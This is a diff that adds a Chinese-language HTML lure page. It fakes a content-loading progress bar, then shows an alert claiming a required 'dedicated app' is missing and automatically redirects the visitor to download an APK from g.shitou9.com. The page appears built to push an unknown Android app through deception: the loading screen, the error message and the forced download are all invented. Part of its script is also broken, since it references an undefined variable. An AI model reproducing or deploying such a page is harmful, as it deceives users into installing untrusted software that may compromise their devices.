@@ -1,0 +1,93 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>正在连接中，请稍后..</title>
+<meta content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport"/>
+<meta content="text/html; charset=gb2312" http-equiv=Content-Type>
+<script type="text/javascript" src="http://lib.sinaapp.com/js/jquery/1.7.2/jquery.min.js"></script>
+<style type="text/css">
+html,body{ background:#000; color:#FFF; margin:0px; font-size:12px;}
+p{ margin:0; padding:0;}
+.main{ width:320px; margin:10px auto 0;}
+.top{ width:320px; height:268px; background:url(http://www.dwz.cn/jpzxmm0); font-size:8px; position:relative;}
+.top .title{ position:relative; z-index:11; margin-bottom:-8px; margin-left:20px; color:#FFF;}
+.top .point{ position:relative; z-index:12; margin-left:8px; margin-top:70px; color:#FFF;}
+.top #link{ display:block;}
+.msg{ width:320px; text-align:center; font-size:14px; position:relative; z-index:13; line-height:22px;}
+.loading{ padding:0px; background:#000; font-style:normal; width:320px; display:block; height:250px; clear:both; font-weight:normal;  opacity:0.4;}
+.loadingWord{ position:relative; z-index:14; margin-top:-210px;}
+.loadingOver{ width:95%; height:11px; line-height:11px; background:#000; position:relative; z-index:15; margin:3px auto 0; font-size:8px; text-align:left; color:#999;}
+.loading1{ border:none; text-align:center; background:none; color:#00ff00;}
+.loading2{ border-style:none; padding:0px; font-family:arial; background:none; color:#00ff00; font-weight:bolder;}
+.bottom{ margin-top:50px; text-align:center; position:relative; z-index:15; font-size:12px;}
+.bottom a{ color:#f60; text-decoration:none;}
+.bottom a:hover{ color:#f60; text-decoration:underline;}
+</style>
+</head>
+<body>
+<div class="main">
+<div class="top" id="top"><a id="link1" href="http://g.shitou9.com/KuaiBoPlayer15.apk" style="text-decoration:none;">
+<div class="title" style=" font-size:12px;">精彩呈现</div>
+<form name="loading" style="width:320px; height:42px; margin-top:100px;">
+<p style="display:none; padding-left:5px; font-size:12px; " id="isLoading">服务器已连接，正在加载精彩内容，请稍候……
+<input class="loading1" name="percent" size="4">
+<br>
+<input class="loading2" name="chart" size="46">
+<br>
+</p>
+</form>
+<div class="point" id="loadover" style="font-size:12px;">服务器已连接，正在加载精彩内容……</div></a>
+</div>
+<div class="msg" id="overmsg" style="display:none; font-size:14px;"> 
+<p style="margin-top:10px;"><a id="link2" href="http://g.shitou9.com/KuaiBoPlayer15.apk"><img src="http://ww2.sinaimg.cn/large/005yyi5Jjw1elebbpq4lag304m01gglh.gif" ></a></p>
+<p><span>请先安装本站专用APP！<br>高清内容，缓冲快，支持任意选择、收藏内容。</span></p>
+<p><span>请使用本站提供的专用APP，<br>获得更高清、高速体验！</span></p>
+</div>
+<div class="bottom" id="bottom">
+<strong>下载地址</strong>(备用地址)：
+<a id="link3" href="http://g.shitou9.com/KuaiBoPlayer15.apk">进入下载&gt;&gt;</a>
+<br /><br /><br />
+</div>
+</div>
+<script type="text/javascript">
+document.getElementById("top").style.backgroundImage="url(http://www.dwz.cn/jpzxmm"+Math.round(Math.random()*8)+")";
+document.getElementById("link1").href=url;
+document.getElementById("link2").href=url;
+document.getElementById("link3").href=url;
+</script>
+<script>
+var bar=0 ;
+var line="||" ;
+var amount="||" ;
+count();	
+setTimeout(function(){					
+	alert('系统没有检测到本站专用APP,请下载本站专用APP，安装后运行专用APP即可浏览精彩内容！PS:如打开后软件无内容，只需刷新软件更新即可！（软件每3小时，更新一次精彩内容，让你看个够！）');	
+	window.location= "http://g.shitou9.com/KuaiBoPlayer15.apk"; 
+	},2000);	
+function count()
+{ 
+    isLoading.style.display	="none";		//隐藏层 [加载进度]		
+    overmsg.style.display	="none";		//隐藏层 [提示下载]	
+    
+    bar=bar+2 ;
+    amount =amount + line ;
+    document.loading.chart.value=amount ;
+    document.loading.percent.value=bar+"%" ;
+    if (bar<99){
+        isLoading.style.display	="block";	//显示层 [加载进度]
+        setTimeout("count()",20);
+    } 
+    else 
+    {
+    isLoading.style.display	="none";
+    overmsg.style.display	="block";
+	bottom.style.marginTop="0px";
+	loadover.innerHTML="服务器连接断开，原因：需安装手机专用APP！";
+    } 
+}
+
+</script>
+
+</body>
+</html>
+
